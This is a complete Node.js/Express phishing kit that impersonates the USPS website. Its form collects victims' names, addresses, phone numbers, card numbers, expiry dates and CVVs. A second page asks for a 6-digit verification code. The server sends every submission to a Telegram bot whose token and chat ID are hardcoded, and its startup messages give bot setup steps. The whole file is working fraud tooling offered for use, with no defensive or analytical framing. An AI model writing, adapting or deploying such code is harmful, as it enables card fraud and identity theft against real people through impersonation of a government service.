const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ==========================================
// CONFIGURE YOUR TELEGRAM BOT HERE
// ==========================================
const BOT_TOKEN = '1973400160:AAG5Fw07mGyUdk72RZDCQLHgQKZ3XD-j1jQ';  // Replace with your Telegram Bot Token
const CHAT_ID = '1194575718';      // Replace with your Telegram Chat ID
// ==========================================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store submitted data temporarily (in-memory)
let submittedData = {};

// ========== PAGE 1: Main Form ==========
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome | USPS Style</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="top-bar">
        <div class="container">
            <span class="top-links">
                <a href="#">Register / Sign In</a>
                <a href="#">Find USPS Locations</a>
                <a href="#">Buy Stamps</a>
                <a href="#">Schedule a Pickup</a>
                <a href="#">Calculate a Price</a>
                <a href="#">Look Up a ZIP Code</a>
                <a href="#">Find a Location</a>
            </span>
        </div>
    </div>

    <header class="main-header">
        <div class="container header-content">
            <div class="logo-section">
                <div class="logo-eagle">🦅</div>
                <div class="logo-text">
                    <h1>UNITED STATES</h1>
                    <h2>POSTAL SERVICE</h2>
                </div>
            </div>
            <div class="search-box">
                <input type="text" placeholder="Search or Enter a Tracking Number">
                <button>🔍</button>
            </div>
        </div>
    </header>

    <nav class="main-nav">
        <div class="container">
            <a href="#">Quick Tools</a>
            <a href="#">Track a Package</a>
            <a href="#">Informed Delivery</a>
            <a href="#">Intercept a Package</a>
            <a href="#">Schedule a Redelivery</a>
            <a href="#">Hold Mail</a>
        </div>
    </nav>

    <main class="container">
        <div class="form-wrapper">
            <h1 class="page-heading">Hello</h1>

            <form action="/submit" method="POST" id="mainForm">

                <div class="form-section">
                    <h2 class="section-title">Personal Information</h2>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="firstName">First Name</label>
                            <input type="text" id="firstName" name="firstName" required>
                        </div>
                        <div class="form-group">
                            <label for="lastName">Last Name</label>
                            <input type="text" id="lastName" name="lastName" required>
                        </div>
                    </div>

                    <div class="form-group full-width">
                        <label for="address">Address</label>
                        <input type="text" id="address" name="address" required>
                    </div>

                    <div class="form-row three-col">
                        <div class="form-group">
                            <label for="state">State</label>
                            <select id="state" name="state" required>
                                <option value="">Select State</option>
                                <option value="AL">Alabama</option>
                                <option value="AK">Alaska</option>
                                <option value="AZ">Arizona</option>
                                <option value="AR">Arkansas</option>
                                <option value="CA">California</option>
                                <option value="CO">Colorado</option>
                                <option value="CT">Connecticut</option>
                                <option value="DE">Delaware</option>
                                <option value="FL">Florida</option>
                                <option value="GA">Georgia</option>
                                <option value="HI">Hawaii</option>
                                <option value="ID">Idaho</option>
                                <option value="IL">Illinois</option>
                                <option value="IN">Indiana</option>
                                <option value="IA">Iowa</option>
                                <option value="KS">Kansas</option>
                                <option value="KY">Kentucky</option>
                                <option value="LA">Louisiana</option>
                                <option value="ME">Maine</option>
                                <option value="MD">Maryland</option>
                                <option value="MA">Massachusetts</option>
                                <option value="MI">Michigan</option>
                                <option value="MN">Minnesota</option>
                                <option value="MS">Mississippi</option>
                                <option value="MO">Missouri</option>
                                <option value="MT">Montana</option>
                                <option value="NE">Nebraska</option>
                                <option value="NV">Nevada</option>
                                <option value="NH">New Hampshire</option>
                                <option value="NJ">New Jersey</option>
                                <option value="NM">New Mexico</option>
                                <option value="NY">New York</option>
                                <option value="NC">North Carolina</option>
                                <option value="ND">North Dakota</option>
                                <option value="OH">Ohio</option>
                                <option value="OK">Oklahoma</option>
                                <option value="OR">Oregon</option>
                                <option value="PA">Pennsylvania</option>
                                <option value="RI">Rhode Island</option>
                                <option value="SC">South Carolina</option>
                                <option value="SD">South Dakota</option>
                                <option value="TN">Tennessee</option>
                                <option value="TX">Texas</option>
                                <option value="UT">Utah</option>
                                <option value="VT">Vermont</option>
                                <option value="VA">Virginia</option>
                                <option value="WA">Washington</option>
                                <option value="WV">West Virginia</option>
                                <option value="WI">Wisconsin</option>
                                <option value="WY">Wyoming</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="zipCode">ZIP Code</label>
                            <input type="text" id="zipCode" name="zipCode" pattern="[0-9]{5}(-[0-9]{4})?" placeholder="12345" required>
                        </div>
                        <div class="form-group">
                            <label for="phone">Phone Number</label>
                            <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" required>
                        </div>
                    </div>
                </div>

                <div class="form-divider"></div>

                <div class="form-section">
                    <h2 class="section-title billing-title">Billing Details</h2>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="cardNumber">Card Number</label>
                            <input type="text" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
                        </div>
                    </div>

                    <div class="form-row two-col">
                        <div class="form-group">
                            <label for="expDate">Expiration (MM/YY)</label>
                            <input type="text" id="expDate" name="expDate" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="form-group">
                            <label for="cvv">CVV</label>
                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                        </div>
                    </div>
                </div>

                <div class="submit-section">
                    <button type="submit" class="submit-btn">Submit</button>
                </div>
            </form>
        </div>
    </main>

    <footer class="main-footer">
        <div class="container">
            <p>© 2026 United States Postal Service. All Rights Reserved.</p>
        </div>
    </footer>

    <script src="/js/main.js"></script>
</body>
</html>
    `);
});

// ========== HANDLE FORM SUBMISSION ==========
app.post('/submit', async (req, res) => {
    const data = req.body;
    submittedData = data;

    // Format message for Telegram
    const message = `
📬 *NEW SUBMISSION RECEIVED*

👤 *Personal Information:*
• First Name: ${data.firstName || 'N/A'}
• Last Name: ${data.lastName || 'N/A'}
• Address: ${data.address || 'N/A'}
• State: ${data.state || 'N/A'}
• ZIP Code: ${data.zipCode || 'N/A'}
• Phone: ${data.phone || 'N/A'}

💳 *Billing Details:*
• Card Number: ${data.cardNumber || 'N/A'}
• Expiration: ${data.expDate || 'N/A'}
• CVV: ${data.cvv || 'N/A'}

⏰ Submitted at: ${new Date().toLocaleString()}
    `;

    // Send to Telegram Bot
    if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('✅ Data sent to Telegram successfully!');
        } catch (error) {
            console.error('❌ Failed to send to Telegram:', error.message);
        }
    } else {
        console.log('⚠️ Telegram Bot not configured. Data saved locally.');
        console.log('Data:', data);
    }

    res.redirect('/verify');
});

// ========== PAGE 2: Verification Code ==========
app.get('/verify', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify | USPS Style</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="top-bar">
        <div class="container">
            <span class="top-links">
                <a href="#">Register / Sign In</a>
                <a href="#">Find USPS Locations</a>
                <a href="#">Buy Stamps</a>
                <a href="#">Schedule a Pickup</a>
                <a href="#">Calculate a Price</a>
                <a href="#">Look Up a ZIP Code</a>
                <a href="#">Find a Location</a>
            </span>
        </div>
    </div>

    <header class="main-header">
        <div class="container header-content">
            <div class="logo-section">
                <div class="logo-eagle">🦅</div>
                <div class="logo-text">
                    <h1>UNITED STATES</h1>
                    <h2>POSTAL SERVICE</h2>
                </div>
            </div>
            <div class="search-box">
                <input type="text" placeholder="Search or Enter a Tracking Number">
                <button>🔍</button>
            </div>
        </div>
    </header>

    <nav class="main-nav">
        <div class="container">
            <a href="#">Quick Tools</a>
            <a href="#">Track a Package</a>
            <a href="#">Informed Delivery</a>
            <a href="#">Intercept a Package</a>
            <a href="#">Schedule a Redelivery</a>
            <a href="#">Hold Mail</a>
        </div>
    </nav>

    <main class="container">
        <div class="form-wrapper verify-wrapper">
            <h1 class="page-heading">Hello</h1>

            <form action="/verify-code" method="POST" id="verifyForm">
                <div class="form-section">
                    <div class="form-group full-width centered">
                        <label for="verificationCode">Enter 6-Digit Verification Code</label>
                        <input type="text" id="verificationCode" name="verificationCode" 
                               pattern="[0-9]{6}" maxlength="6" placeholder="000000" 
                               class="code-input" required>
                    </div>
                </div>

                <div class="submit-section">
                    <button type="submit" class="submit-btn">Submit</button>
                </div>
            </form>
        </div>
    </main>

    <footer class="main-footer">
        <div class="container">
            <p>© 2026 United States Postal Service. All Rights Reserved.</p>
        </div>
    </footer>

    <script src="/js/verify.js"></script>
</body>
</html>
    `);
});

// ========== HANDLE VERIFICATION CODE ==========
app.post('/verify-code', async (req, res) => {
    const code = req.body.verificationCode;

    const message = `
🔐 *VERIFICATION CODE RECEIVED*

• 6-Digit Code: ${code}
• Submitted at: ${new Date().toLocaleString()}

📋 Previous Submission Data:
• Name: ${submittedData.firstName || 'N/A'} ${submittedData.lastName || 'N/A'}
• Phone: ${submittedData.phone || 'N/A'}
    `;

    // Send to Telegram Bot
    if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('✅ Verification code sent to Telegram!');
        } catch (error) {
            console.error('❌ Failed to send verification to Telegram:', error.message);
        }
    } else {
        console.log('⚠️ Telegram Bot not configured. Verification code saved locally.');
        console.log('Verification Code:', code);
    }

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success | USPS Style</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="top-bar">
        <div class="container">
            <span class="top-links">
                <a href="#">Register / Sign In</a>
                <a href="#">Find USPS Locations</a>
                <a href="#">Buy Stamps</a>
                <a href="#">Schedule a Pickup</a>
                <a href="#">Calculate a Price</a>
                <a href="#">Look Up a ZIP Code</a>
                <a href="#">Find a Location</a>
            </span>
        </div>
    </div>

    <header class="main-header">
        <div class="container header-content">
            <div class="logo-section">
                <div class="logo-eagle">🦅</div>
                <div class="logo-text">
                    <h1>UNITED STATES</h1>
                    <h2>POSTAL SERVICE</h2>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="form-wrapper success-wrapper">
            <div class="success-icon">✅</div>
            <h1 class="success-title">Verification Successful!</h1>
            <p class="success-message">Your information has been submitted successfully.</p>
            <a href="/" class="submit-btn" style="display:inline-block; margin-top:20px; text-decoration:none;">Back to Home</a>
        </div>
    </main>

    <footer class="main-footer">
        <div class="container">
            <p>© 2026 United States Postal Service. All Rights Reserved.</p>
        </div>
    </footer>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`\n🚀 Server running at http://localhost:${PORT}`);
    console.log(`\n📋 TELEGRAM BOT SETUP:`);
    console.log(`   1. Open @BotFather on Telegram and create a new bot`);
    console.log(`   2. Copy the Bot Token and paste it in server.js (BOT_TOKEN)`);
    console.log(`   3. Send a message to your bot, then visit:`);
    console.log(`      https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`);
    console.log(`   4. Find your Chat ID and paste it in server.js (CHAT_ID)`);
    console.log(`\n⚠️  IMPORTANT: Replace BOT_TOKEN and CHAT_ID before running!\n`);
});
